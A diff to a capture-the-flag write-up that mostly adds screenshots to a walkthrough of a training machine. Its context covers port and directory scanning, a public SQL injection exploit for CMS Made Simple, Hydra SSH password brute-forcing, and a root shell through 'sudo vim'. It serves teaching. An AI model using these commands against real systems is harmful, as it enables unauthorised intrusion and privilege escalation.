@@ -26,6 +26,7 @@ nmap -sC -sV -p- <target_ip>
 - `-p-`: Scans all TCP ports.
 
 The scan reveals three open ports:
+<img width="1165" height="361" alt="image" src="https://github.com/user-attachments/assets/a28f894b-7e30-4abf-9f41-ead5ecd3fa22" />
 
 | Port | Service |
 |---|---|
@@ -52,6 +53,7 @@ To discover hidden directories and files, we use **Gobuster**.
 ```bash
 gobuster dir -u <target_URL> -w <wordlist>
 ```
+<img width="1114" height="477" alt="image" src="https://github.com/user-attachments/assets/5744a055-e3c2-4eba-82fc-2b6f3b6563cd" />
 
 Gobuster performs directory enumeration by testing potential paths against the web server.
 
@@ -62,6 +64,7 @@ The scan reveals an interesting directory:
 The server responds with HTTP status code `200`, meaning the requested resource was successfully accessed.
 
 Let's investigate it!
+<img width="1507" height="804" alt="image" src="https://github.com/user-attachments/assets/bc38a504-7124-47d4-b69f-072261333d1b" />
 
 While exploring the website, we discover that it is running:
 
@@ -76,10 +79,12 @@ After identifying the CMS and its version, we search for known vulnerabilities a
 One interesting vulnerability is:
 
 **CVE-2019-9053 — SQL Injection**
+<img width="1618" height="900" alt="image" src="https://github.com/user-attachments/assets/675a1842-014d-44ec-af2a-debd5abd70fb" />
 
 This vulnerability affects CMS Made Simple versions up to 2.2.9.
 
 SQL Injection (SQLi) occurs when an application handles user input unsafely, potentially allowing an attacker to manipulate database queries.
+<img width="1839" height="226" alt="image" src="https://github.com/user-attachments/assets/78ea97dc-130a-4c05-9691-df843e37765c" />
 
 Let's answer the room's questions:
 
@@ -94,8 +99,8 @@ Answer: `SQL Injection (SQLi)`
 ## 4. Exploitation
 
 After identifying the vulnerability, we move to exploitation.
-
 Our objective is to investigate whether we can exploit the SQL injection to retrieve sensitive information from the application.
+<img width="1821" height="607" alt="image" src="https://github.com/user-attachments/assets/bd0b82af-17cb-42b3-b305-b5dfbadee62a" />
 
 ### Finding the exploit
 
@@ -104,6 +109,7 @@ We use SearchSploit to search for publicly available exploits associated with th
 ```bash
 searchsploit --cve 2019-9053
 ```
+<img width="1162" height="514" alt="image" src="https://github.com/user-attachments/assets/cf94362e-66f1-432e-a59b-973fb86c6fa5" />
 
 We find an exploit and copy it into our current working directory:
 
@@ -128,10 +134,9 @@ python 46635.py -h
 However, we encounter a `SyntaxError`.
 
 After investigating, we notice that the script uses Python 2 syntax, particularly in its `print` statements, while we're trying to execute it using Python 3.
-
 We start adapting the syntax, but keep in mind that additional Python 2 compatibility issues may also need to be addressed.
-
 After inspecting the script, we identify its usage syntax:
+<img width="1254" height="94" alt="image" src="https://github.com/user-attachments/assets/21709865-d8a5-4aba-a2b5-5b0c333384eb" />
 
 ```bash
 python 46635.py -u <target_URL> --crack -w <wordlist_path>
@@ -155,11 +160,11 @@ At this point, we have two possible approaches:
 **Method 1 — Fix the exploit**
 
 We can investigate the remaining errors, correct the script, and attempt to crack the extracted password hash.
+<img width="808" height="196" alt="image" src="https://github.com/user-attachments/assets/f2fb0685-7431-4a44-b833-c4e42c25c08e" />
 
 **Method 2 — Try SSH password brute-forcing**
 
 Since we have discovered an SSH service on port 2222 and obtained a username, we can investigate whether a password from a wordlist allows authentication.
-
 For this, we use Hydra:
 
 ```bash
@@ -172,7 +177,7 @@ And we get a match!
 
 **The password is:** `secret`
 
-*Screenshot: Hydra results*
+<img width="1884" height="307" alt="image" src="https://github.com/user-attachments/assets/db1da9df-240f-44e7-97f9-931be112f591" />
 
 ### Answering the room's question
 
@@ -187,6 +192,7 @@ Now that we have the credentials, we can connect to the target through SSH.
 ```bash
 ssh mitch@<target_ip> -p 2222
 ```
+<img width="578" height="297" alt="Capture d&#39;écran 2026-11-01 130332" src="https://github.com/user-attachments/assets/e0fcc3ee-ddce-4904-9750-9532c6429f98" />
 
 We enter the password we discovered.
 
@@ -197,6 +203,7 @@ Our initial access is successful.
 ### Exploring the machine
 
 Let's start by checking our current directory and exploring the filesystem.
+<img width="850" height="286" alt="image" src="https://github.com/user-attachments/assets/3d368d81-7650-4a2a-ad30-ff4b77909776" />
 
 We can find the user flag using:
 
@@ -224,7 +231,6 @@ Answer: `sunbath`
 ## 6. Privilege Escalation
 
 We now have access to the machine as a standard user, but our objective isn't complete.
-
 We need to investigate whether we can escalate our privileges and obtain root access.
 
 First, let's check which commands our current user is allowed to execute with sudo:
@@ -236,21 +242,21 @@ sudo -l
 This command lists the sudo privileges available to the current user.
 
 And here's where things get interesting!
+<img width="723" height="88" alt="image" src="https://github.com/user-attachments/assets/edda17c2-af9e-40d9-ba35-5ff9658c5239" />
 
 We discover that `mitch` can execute **Vim as root without providing a password**.
 
 Why is this a security issue?
 
 Vim is a text editor, but it also supports executing shell commands. When Vim is launched with root privileges, those commands can inherit those privileges.
-
 This means that unrestricted sudo access to Vim can be abused to obtain a root shell.
 
 ### Using GTFOBins
 
 To understand how to exploit this configuration, we consult [GTFOBins](https://gtfobins.org/), a reference containing techniques for abusing Unix binaries when they have specific privileges or configurations.
+<img width="1477" height="781" alt="image" src="https://github.com/user-attachments/assets/55658a58-7875-41a6-947a-d8d19e45e975" />
 
 Since we can execute Vim through sudo, we look for its sudo exploitation technique.
-
 We can use:
 
 ```bash
@@ -258,7 +264,6 @@ sudo vim -c ':!/bin/sh'
 ```
 
 This launches Vim as root and executes a shell command, allowing us to obtain a privileged shell.
-
 We can verify our privileges using:
 
 ```bash
@@ -270,7 +275,7 @@ If everything worked, the output should be:
 ```text
 root
 ```
-
+<img width="585" height="132" alt="image" src="https://github.com/user-attachments/assets/475af1c2-5ce4-42f7-aba2-1c81063d3f7f" />
 We've successfully escalated our privileges!
 
 ### Finding the root flag
@@ -292,7 +297,7 @@ Once we find the file, we read its contents:
 ```bash
 cat <root_flag_path>
 ```
-
+<img width="633" height="325" alt="image" src="https://github.com/user-attachments/assets/91234175-6aae-4297-bc79-da4a1f265924" />
 And we've reached our final objective!
 
 **What's the root flag?**
